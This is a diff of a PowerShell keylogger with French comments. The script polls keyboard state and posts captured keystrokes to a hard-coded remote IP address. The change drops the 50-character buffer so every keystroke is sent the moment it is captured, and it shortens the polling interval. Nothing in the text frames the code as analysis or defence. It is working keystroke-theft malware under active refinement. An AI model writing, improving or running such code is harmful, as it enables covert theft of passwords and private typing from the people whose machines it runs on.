@@ -1,5 +1,4 @@
 $serverUrl = "http://20.121.45.132:8080"
-$log = ""
 
 # Fonction pour envoyer les données au serveur
 function Send-Data {
@@ -8,18 +7,15 @@ function Send-Data {
     Invoke-WebRequest -Uri $serverUrl -Method POST -Body $body
 }
 
-# Boucle pour capturer les frappes
+# Boucle pour capturer et envoyer les frappes immédiatement
 while ($true) {
-    Start-Sleep -Milliseconds 100
+    Start-Sleep -Milliseconds 50
     for ($key = 8; $key -le 254; $key++) {
         $state = [Windows.Input.Keyboard]::IsKeyDown($key)
         if ($state) {
             $char = [char]$key
-            $log += $char
-            if ($log.Length -ge 50) {
-                Send-Data -data $log
-                $log = ""
-            }
+            # Envoi immédiat de chaque frappe
+            Send-Data -data $char
         }
     }
 }
